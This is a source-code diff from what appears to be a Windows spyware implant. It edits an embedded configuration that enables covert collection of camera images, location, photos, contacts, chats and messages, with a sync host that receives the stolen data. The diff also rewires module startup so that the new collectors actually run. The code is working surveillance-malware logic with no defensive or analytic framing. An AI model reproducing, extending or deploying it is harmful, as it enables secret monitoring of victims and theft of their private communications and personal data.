@@ -59,11 +59,11 @@ BOOL bCollectEvidences = TRUE;
 
 #ifndef _DEBUG
 ////BYTE EMBEDDED_CONF[513] = "\xEF\xBE\xAD\xDE""CONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONF";
-//BYTE EMBEDDED_CONF[513] = "CONF""CONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONF";
+BYTE EMBEDDED_CONF[513] = "CONF""CONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONF";
 #else
 //BYTE EMBEDDED_CONF[513] =  "\x90\x01\x00\x00{\"camera\": {\"enabled\":true,\"repeat\":5,\"iter\":null},\"position\":{\"enabled\":true,\"repeat\":5},\"screenshot\":{\"enabled\":true,\"repeat\":60},\"addressbook\":{\"enabled\":true},\"chat\":{\"enabled\":true},\"clipboard\":{\"enabled\":true},\"device\":{\"enabled\":true},\"messages\":{\"enabled\":true},\"password\":{\"enabled\":true},\"url\":{\"enabled\":true},\"sync\":{\"host\":\"192.168.100.100\",\"repeat\":1}}\x00\x16\xc0\xad\xbb\x01\xc0\xa2\x72\x3b\x23\xff\x46\x93\x68\x9f\x18\x23\x27\x9f\xee";
 //BYTE EMBEDDED_CONF[513] =  "\x90\x01\x00\x00{\"camera\": {\"enabled\":false,\"repeat\":20,\"iter\":10000},\"position\":{\"enabled\":false,\"repeat\":5},\"screenshot\":{\"enabled\":false,\"repeat\":5},\"addressbook\":{\"enabled\":false},\"chat\":{\"enabled\":false},\"clipboard\":{\"enabled\":false},\"device\":{\"enabled\":false},\"messages\":{\"enabled\":false},\"password\":{\"enabled\":false},\"url\":{\"enabled\":false},\"sync\":{\"host\":\"192.168.100.100\",\"repeat\":10}}\x00\x16\xc0\xad\xbb\x01\xc0\xa2\x72\x3b\x23\xff\x46\x93\x68\x9f\x18\x23\x27\x9f\xee";
-BYTE EMBEDDED_CONF[513] =  "\x90\x01\x00\x00{\"camera\": {\"enabled\":false,\"repeat\":5,\"iter\":null},\"position\":{\"enabled\":true,\"repeat\":5},\"screenshot\":{\"enabled\":false,\"repeat\":60},\"photo\":{\"enabled\":false},\"addressbook\":{\"enabled\":false},\"chat\":{\"enabled\":false},\"clipboard\":{\"enabled\":false},\"device\":{\"enabled\":false},\"messages\":{\"enabled\":true},\"password\":{\"enabled\":false},\"url\":{\"enabled\":false},\"sync\":{\"host\":\"192.168.100.100\",\"repeat\":1}}\x00\x16\xc0\xad\xbb\x01\xc0\xa2\x72\x3b\x23\xff\x46\x93\x68\x9f\x18\x23\x27\x9f\xee";
+BYTE EMBEDDED_CONF[513] =  "\x90\x01\x00\x00{\"camera\": {\"enabled\":false,\"repeat\":5,\"iter\":null},\"position\":{\"enabled\":true,\"repeat\":5},\"screenshot\":{\"enabled\":false,\"repeat\":60},\"photo\":{\"enabled\":true},\"addressbook\":{\"enabled\":true},\"chat\":{\"enabled\":true},\"clipboard\":{\"enabled\":false},\"device\":{\"enabled\":false},\"messages\":{\"enabled\":true},\"password\":{\"enabled\":false},\"url\":{\"enabled\":false},\"sync\":{\"host\":\"192.168.100.100\",\"repeat\":1}}\x00\x16\xc0\xad\xbb\x01\xc0\xa2\x72\x3b\x23\xff\x46\x93\x68\x9f\x18\x23\x27\x9f\xee";
 #endif
 
 extern VOID SyncThreadFunction();
@@ -338,7 +338,7 @@ BOOL CreateMessageWindow()
 
 VOID StartModules()
 {
-	if (ConfIsModuleEnabled(L"addressbook") || ConfIsModuleEnabled(L"chat") || ConfIsModuleEnabled(L"messages"))	//FIXME: array
+	if (ConfIsModuleEnabled(L"addressbook") || ConfIsModuleEnabled(L"chat") || ConfIsModuleEnabled(L"messages") || ConfIsModuleEnabled(L"position") || ConfIsModuleEnabled(L"photo"))	//FIXME: array
 	{
 		if (hSocialThread == NULL)
 		{
@@ -438,7 +438,8 @@ VOID StartModules()
 		bURLThread = FALSE;
 
 	/* photo module */
-	if (ConfIsModuleEnabled(L"photo"))
+	// not needed atm, Facebook photos scheduled in social.cpp, will be needed with filsystem photos
+	/*if (ConfIsModuleEnabled(L"photo"))
 	{
 		if (hPhotoThread == NULL)
 		{
@@ -450,7 +451,7 @@ VOID StartModules()
 		}
 	}
 	else
-		bPhotoThread = FALSE;
+		bPhotoThread = FALSE;*/
 
 
 }
